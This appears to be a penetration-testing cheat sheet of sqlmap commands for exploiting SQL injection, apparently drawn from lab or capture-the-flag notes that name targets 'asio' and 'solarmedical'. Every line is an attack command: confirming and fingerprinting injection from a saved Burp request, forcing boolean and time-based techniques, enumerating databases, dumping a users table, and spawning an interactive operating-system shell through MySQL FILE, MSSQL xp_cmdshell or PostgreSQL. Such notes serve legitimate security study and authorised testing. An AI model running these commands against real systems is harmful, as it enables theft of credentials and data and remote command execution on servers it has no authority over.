## sqlmap — when manual stalls (save the Burp request first: right-click > Copy to file)
sqlmap -r req.txt --batch --dbms=mysql                          # confirm + fingerprint from a saved request
sqlmap -r req.txt --batch -p param --technique=BT               # force boolean/time if auto picks nothing
sqlmap -r req.txt --batch --dbs                                 # then --tables -D db / --dump -D db -T users
sqlmap -r req.txt --batch --os-shell                            # interactive OS shell (MySQL FILE / MSSQL xp_cmdshell / PG)
sqlmap -r req.txt --batch --dbms=mssql --os-shell               # MSSQL direct-to-shell (asio/solarmedical style)
